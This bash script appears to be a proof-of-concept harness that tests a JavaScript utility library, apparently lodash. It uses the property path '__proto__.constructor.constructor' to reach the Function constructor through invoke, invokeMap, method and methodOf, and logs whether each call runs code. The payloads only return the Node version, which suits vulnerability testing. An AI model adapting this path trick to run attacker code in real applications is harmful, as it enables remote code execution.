#!/bin/bash
L="$1"
run() {
  local name="$1"; local code="$2"
  node -e "
const _=require('$L');
let out=null,err=null;
try{ out = $code }catch(e){ err=e.constructor.name+': '+e.message; }
console.log(JSON.stringify({t:'$name',ver:_.VERSION,result:String(out).slice(0,60),err:err}));
" 2>&1
}
P="['__proto__','constructor','constructor']"
run invoke_rce      "_.invoke({}, $P, 'return process.version')()"
run invoke_direct   "_.invoke({}, $P, 'return process.version')"
run invokeMap_rce   "_.invokeMap([{}], $P, 'return process.version')[0]()"
run method_rce      "_.method($P, 'return process.version')({})()"
run methodOf_rce    "_.methodOf({}, $P)('return process.version')()"
run invoke_arr_path "_.invoke({}, ['__proto__','constructor','constructor','assign'], 'return 1')"
run method_plain    "_.method($P, 'return 1')({})()"
